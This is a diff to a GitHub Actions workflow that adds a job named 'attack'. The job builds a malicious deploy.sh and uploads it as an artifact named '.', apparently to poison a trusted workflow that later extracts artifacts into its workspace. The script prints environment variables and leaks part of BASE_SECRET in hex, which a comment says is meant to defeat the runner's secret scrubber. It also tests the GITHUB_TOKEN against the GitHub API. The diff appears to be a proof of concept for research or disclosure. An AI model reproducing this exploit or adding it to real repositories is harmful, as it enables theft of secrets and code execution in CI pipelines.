@@ -29,3 +29,61 @@ jobs:
         with:
           name: build-output
           path: dist/
+
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft evil deploy.sh at workspace root
+        run: |
+          cat > deploy.sh <<'EOF'
+          #!/bin/bash
+          echo ""
+          echo "########################################################"
+          echo "#  ATTACKER CODE EXECUTING IN TRUSTED BASE-REPO CONTEXT  #"
+          echo "########################################################"
+          echo ""
+          echo "whoami:      $(whoami)"
+          echo "pwd:         $(pwd)"
+          echo "hostname:    $(hostname)"
+          echo "date:        $(date -u)"
+          echo ""
+          echo "=== Environment (filtered) ==="
+          env | grep -E "^(GITHUB_|BASE_SECRET)" | sed 's/\(TOKEN=\)[a-zA-Z0-9_]*/\1<REDACTED_'$(echo -n "$GITHUB_TOKEN" | wc -c)'_chars>/' | sort
+          echo ""
+          echo "=== Secret proof ==="
+          if [ -n "$BASE_SECRET" ]; then
+            echo "BASE_SECRET is accessible to attacker code!"
+            echo "  length: ${#BASE_SECRET} chars"
+            echo "  prefix: ${BASE_SECRET:0:20}..."
+            # Hex encode to defeat runner secret scrubber
+            echo "  hex (first 32 bytes): $(echo -n "$BASE_SECRET" | head -c 32 | xxd -p)"
+          else
+            echo "BASE_SECRET not in env"
+          fi
+          echo ""
+          echo "=== GITHUB_TOKEN proof ==="
+          if [ -n "$GITHUB_TOKEN" ]; then
+            echo "GITHUB_TOKEN is accessible to attacker code!"
+            echo "  length: ${#GITHUB_TOKEN} chars"
+            echo "  prefix: ${GITHUB_TOKEN:0:8}..."
+            # Verify token works against github.com API (read a protected field)
+            USER_JSON=$(curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY)
+            echo "  API probe result: $(echo "$USER_JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print('repo=' + d.get('full_name','?') + ' permissions=' + str(d.get('permissions',{})))")"
+          fi
+          echo ""
+          echo "########################################################"
+          echo "#  RCE PROVEN — attacker would now exfiltrate/escalate  #"
+          echo "########################################################"
+          EOF
+          chmod +x deploy.sh
+          echo "=== deploy.sh built ==="
+          wc -c deploy.sh
+          sha256sum deploy.sh
+
+      - name: Upload the evil deploy.sh as an artifact with name="."
+        uses: actions/upload-artifact@v4
+        with:
+          name: .
+          path: deploy.sh
+          if-no-files-found: error
+          overwrite: false
